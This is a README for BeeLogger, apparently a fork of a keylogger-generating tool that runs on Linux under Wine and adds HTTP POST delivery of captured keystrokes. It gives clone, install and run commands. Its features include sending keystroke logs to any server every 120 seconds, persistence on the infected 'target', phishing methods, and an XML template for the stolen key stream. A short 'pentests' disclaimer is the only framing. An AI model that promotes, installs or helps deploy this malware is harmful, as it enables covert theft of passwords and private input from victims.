# BeeLogger

Copyright 2018 BeeLogger
Written by: * **Alisson Moretto** - [4w4k3](https://github.com/4w4k3)
Updated by: * **xmaster** - [black-zone-1000](https://github.com/black-zone-1000/HTTPBeeLogger/)

Updated by xmaster @ black-zone-1000
To allow HTTP POST

TOOL DESIGNED TO GOOD PURPOSES, PENTESTS, DON'T BE A CRIMINAL !

**Only download it here, do not trust in other places.**

## HOW TO INSTALL:

Video: https://www.youtube.com/watch?v=ifOGkOTS5zk

### Cloning:
```
git clone https://github.com/black-zone-1000/HTTPBeeLogger.git
```

### Running:
```
cd BeeLogger
```

```
sudo su
```

```
chmod +x install.sh
```

```
./install.sh
```

```
python bee.py
```

If you have another version of Python:

```
python2.7 bee.py
```

## DISCLAIMER: 

"DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
Taken from [LICENSE](LICENSE).

## TO KNOW
To disable bee just run [UnInfectMe.bat](UnInfectMe.bat) on target.

## Features 

- Send logs each 120 seconds.
- Send logs when chars > 50.
- Send logs To any HTTP server via POST
- Some Phishing methods are included.
- Multiple Session disabled.
- Auto Persistence.

### Prerequisites

* apt
* wine
* wget
* Linux
* sudo
* python2.7
* python 2.7 on Wine Machine
* pywin32 on Wine Machine
* pythoncom on Wine Machine

****

HTTP POST updates:
------------------

Due to the need of 'requests' to run HTTP POST commands, run this on installation:
wine ~/.wine/drive_c/Python27/python -m pip install requests

To avoid issues with the HTTP stream sending to be used as XML or JSON (in case it contains special charecters), the data can be encoded in Base64

Here is an example of post data format that can be used for XML:
```xml
<DATA><KEYS><![CDATA[$KeyStream$]]></KEYS><DATE>$Date$</DATE></DATA>
```

### Tested on:

+ Kali Linux - ROLLING

## License:

This project is licensed under the BSD-3-Clause - see the [LICENSE](LICENSE) file for details.
